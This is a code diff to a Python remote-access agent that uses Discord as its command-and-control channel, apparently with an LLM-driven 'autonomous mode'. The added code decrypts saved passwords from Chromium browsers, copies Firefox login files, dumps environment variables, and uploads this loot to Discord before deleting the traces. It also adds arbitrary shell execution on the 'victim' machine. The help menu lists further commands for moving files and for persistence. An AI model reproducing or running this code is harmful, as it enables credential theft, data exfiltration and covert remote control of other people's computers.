@@ -1,8 +1,10 @@
 # --- Discord and OpenAI API Keys ---
-***REMOVED***
-***REMOVED***
+BOT_TOKEN = ""
+OPENAI_API_KEY = ""
 # --- Required Imports ---
+
 import os
+import Crypto
 import re
 import subprocess
 import getpass
@@ -15,6 +17,7 @@ import time
 import datetime
 import json
 import ctypes
+
 
 INSTANCE_MUTEX_HANDLE = None
 
@@ -218,20 +221,27 @@ class DiscordC2(discord.Client):
                 return
         # !help command
         if cmd.startswith("!help"):
-            help_text = (
-                """
+            args = content.split()
+            subcmd = args[1].lower() if len(args) > 1 else None
+            if not subcmd:
+                help_text = (
+                    """
 **General Commands:**
     • `!help` — Show this help menu
-    • `!report` — Generate the current assessment report and upload it to #reports
-    • `!abort` — Stop autonomous mode, switch to passive mode, and generate a report
+    • `!help <command>` — Show help for a specific command
+   
     • `!mode active` — Start autonomous mode and hand control to the LLM
     • `!mode passive` — Return to passive mode and generate a report when leaving active mode
+    • `!report` — Generate the current assessment report and upload it to #reports
+    • `!abort` — Stop autonomous mode, switch to passive mode, and generate a report
     • `!message <text>` — Show a message box on victim
     • `!ls [path]` — List directory contents
     • `!cd [path]` — Change current directory
     • `!download [path]` — Download a file from the victim
     • `!upload <url|filename> [dest]` — Upload a file from URL or #payloads
     • `!delete <path>` — Delete a file on the victim
+    • `!dump [type]` — Collect hashes, browser passwords, WiFi keys, and other loot (types: hash, password, wifi, env, all)
+    • `!shell <command>` — Run a system shell command and return output
     • Any other text — Executed as a shell command in the agent's current directory
 
 **Persistence & OPSEC:**
@@ -250,8 +260,194 @@ class DiscordC2(discord.Client):
     - Commands are only processed in this agent's assigned command channel
     - Use `!help` at any time to display this menu
 """
-            )
-            await message.channel.send(help_text)
+                )
+                await message.channel.send(help_text)
+                return
+            # Detailed help for specific commands
+            command_help = {
+                "help": "`!help [command]` — Show this help menu or details for a specific command.",
+                "report": "`!report` — Generate the current assessment report and upload it to #reports.",
+                "abort": "`!abort` — Stop autonomous mode, switch to passive mode, and generate a report.",
+                "mode": "`!mode active|passive` — Switch between autonomous (active) and passive modes.",
+                "message": "`!message <text>` — Show a message box on the victim's screen.",
+                "ls": "`!ls [path]` — List directory contents. Defaults to current directory if no path is given.",
+                "cd": "`!cd [path]` — Change the current working directory.",
+                "download": "`!download [path]` — Download a file from the victim machine.",
+                "upload": "`!upload <url|filename> [dest]` — Upload a file from a URL or from #payloads to the victim.",
+                "delete": "`!delete <path>` — Delete a file on the victim machine.",
+                "dump": (
+                    "`!dump [type]` — Collect offensive security loot.\n"
+                    "Types:\n"
+                    "  password — Only dump browser-saved passwords\n"
+                    "  env — Only dump environment variables\n"
+                    "  all — Dump everything (default if no type given)"
+                ),
+                "shell": "`!shell <command>` — Run a system shell command and return the output.",
+                "persist": (
+                    "`!persist [setup|cleanup]` — Setup or remove persistence.\n"
+                    "  setup — Apply all methods (default)\n"
+                    "  cleanup — Remove all persistence for OPSEC"
+                ),
+            }
+            key = subcmd.strip("!")
+            msg = command_help.get(key)
+            if msg:
+                await message.channel.send(f"**Help for `{subcmd}`:**\n{msg}")
+            else:
+                await message.channel.send(f"No detailed help available for `{subcmd}`.")
+            return
+        # !dump command
+        if cmd.startswith("!dump"):
+            args = content.split()
+            subcmd = args[1].lower() if len(args) > 1 else "all"
+            await message.channel.send(f"[dump] Collecting: {subcmd}")
+            loot_files = []
+            errors = []
+
+            # Browser passwords
+            if subcmd in ("all", "password", "passwords"):
+                try:
+                    import shutil
+                    import glob
+                    import base64
+                    import json as js
+                    import win32crypt
+                    from Crypto.Cipher import AES
+                    import sqlite3
+                    user_dir = os.environ.get("USERPROFILE") or os.path.expanduser("~")
+                    chromium_browsers = [
+                        ("Chrome", os.path.join(user_dir, r"AppData\Local\Google\Chrome\User Data")),
+                        ("Edge", os.path.join(user_dir, r"AppData\Local\Microsoft\Edge\User Data")),
+                        ("Brave", os.path.join(user_dir, r"AppData\Local\BraveSoftware\Brave-Browser\User Data")),
+                        ("Opera", os.path.join(user_dir, r"AppData\Roaming\Opera Software\Opera Stable")),
+                        ("OperaGX", os.path.join(user_dir, r"AppData\Roaming\Opera Software\Opera GX Stable")),
+                        ("Vivaldi", os.path.join(user_dir, r"AppData\Local\Vivaldi\User Data")),
+                    ]
+                    for browser, base_path in chromium_browsers:
+                        local_state_path = os.path.join(base_path, "Local State")
+                        # Try all profiles in the browser's user data dir
+                        if os.path.exists(base_path):
+                            profiles = ["Default"]
+                            try:
+                                profiles += [d for d in os.listdir(base_path) if d.startswith("Profile ")]
+                            except Exception:
+                                pass
+                            for profile in profiles:
+                                login_db = os.path.join(base_path, profile, "Login Data")
+                                if os.path.exists(login_db) and os.path.exists(local_state_path):
+                                    loot_path = os.path.join(self.current_dir, f"{browser}_{profile}_passwords.json")
+                                    try:
+                                        shutil.copy2(login_db, "login_db_copy")
+                                        with open(local_state_path, "r", encoding="utf-8") as f:
+                                            local_state = js.load(f)
+                                        key_b64 = local_state["os_crypt"]["encrypted_key"]
+                                        key = base64.b64decode(key_b64)[5:]
+                                        master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+                                        conn = sqlite3.connect("login_db_copy")
+                                        cursor = conn.cursor()
+                                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                                        loot_data = []
+                                        for row in cursor.fetchall():
+                                            url, username, encrypted = row
+                                            if encrypted[:3] == b'v10':
+                                                iv = encrypted[3:15]
+                                                payload = encrypted[15:]
+                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                                try:
+                                                    decrypted = cipher.decrypt(payload)[:-16].decode()
+                                                except Exception:
+                                                    decrypted = "[decryption failed]"
+                                            else:
+                                                try:
+                                                    decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
+                                                except Exception:
+                                                    decrypted = "[decryption failed]"
+                                            loot_data.append({"url": url, "user": username, "pass": decrypted})
+                                        with open(loot_path, "w", encoding="utf-8") as loot:
+                                            js.dump(loot_data, loot, indent=2)
+                                        conn.close()
+                                        loot_files.append(loot_path)
+                                    finally:
+                                        try:
+                                            os.remove("login_db_copy")
+                                        except Exception:
+                                            pass
+                    # Firefox: just copy logins.json (decryption is more complex)
+                    ff_profiles = glob.glob(os.path.join(user_dir, r"AppData\Roaming\Mozilla\Firefox\Profiles\*"))
+                    for prof in ff_profiles:
+                        logins = os.path.join(prof, "logins.json")
+                        if os.path.exists(logins):
+                            loot_path = os.path.join(self.current_dir, os.path.basename(prof) + "_logins.json")
+                            shutil.copy2(logins, loot_path)
+                            loot_files.append(loot_path)
+                except Exception as e:
+                    errors.append(f"Browser loot error: {e}")
+            # WiFi keys
+            # Env vars
+            if subcmd in ("all", "env", "envs", "envvar", "envvars"):
+                try:
+                    env_out = os.path.join(self.current_dir, "env_vars.json")
+                    with open(env_out, "w", encoding="utf-8") as f:
+                        import json as js
+                        js.dump(dict(os.environ), f, indent=2)
+                    loot_files.append(env_out)
+                except Exception as e:
+                    errors.append(f"Env var dump error: {e}")
+            # Send loot files
+            if loot_files:
+                sent_any = False
+                for fpath in loot_files:
+                    try:
+                        await message.channel.send(file=discord.File(fpath))
+                        await self.global_logs_channel.send(f"[dump] {self.hostname}: Sent loot file {fpath}")
+                        sent_any = True
+                    except Exception as e:
+                        errors.append(f"Send file error ({fpath}): {e}")
+                    finally:
+                        # Remove all loot files after upload attempt (OPSEC: nothing left behind)
+                        try:
+                            if os.path.exists(fpath):
+                                os.remove(fpath)
+                        except Exception:
+                            pass
+                if not sent_any:
+                    await message.channel.send("[dump] No loot files could be sent (none found or all failed).")
+                elif errors:
+                    await message.channel.send("[dump] Some errors occurred:\n" + "\n".join(errors))
+                    await self.global_logs_channel.send(f"[dump] {self.hostname}: Errors: {'; '.join(errors)}")
+                else:
+                    await message.channel.send("[dump] Complete. All loot sent.")
+            else:
+                await message.channel.send("[dump] No loot files found for this command.")
+            return
+        # !shell command
+        if cmd.startswith("!shell "):
+            shell_cmd = content[7:].strip()
+            if not shell_cmd:
+                await message.channel.send("❌ Usage: !shell <command>")
+                return
+            try:
+                import subprocess
+                result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, cwd=self.current_dir)
+                output = result.stdout.strip() + ("\n" + result.stderr.strip() if result.stderr.strip() else "")
+                if not output:
+                    output = "[Command executed with no output]"
+                if len(output) > 1900:
+                    out_file = os.path.join(self.current_dir, "shell_output.txt")
+                    with open(out_file, "w", encoding="utf-8") as f:
+                        f.write(output)
+                    await message.channel.send("📄 Output too large, attached as file:", file=discord.File(out_file))
+                    await self.global_logs_channel.send(f"[shell] {self.hostname}: Output too large, sent as file.")
+                    try:
+                        os.remove(out_file)
+                    except Exception:
+                        pass
+                else:
+                    await message.channel.send(f"```\n{output}\n```")
+                    await self.global_logs_channel.send(f"[shell] {self.hostname}: {shell_cmd}\n{output}")
+            except Exception as e:
+                await message.channel.send(f"❌ Shell execution error: {e}")
+                await self.global_logs_channel.send(f"[shell] {self.hostname}: Shell execution error: {e}")
             return
         # !message command (show message box)
         if cmd.startswith("!message"):
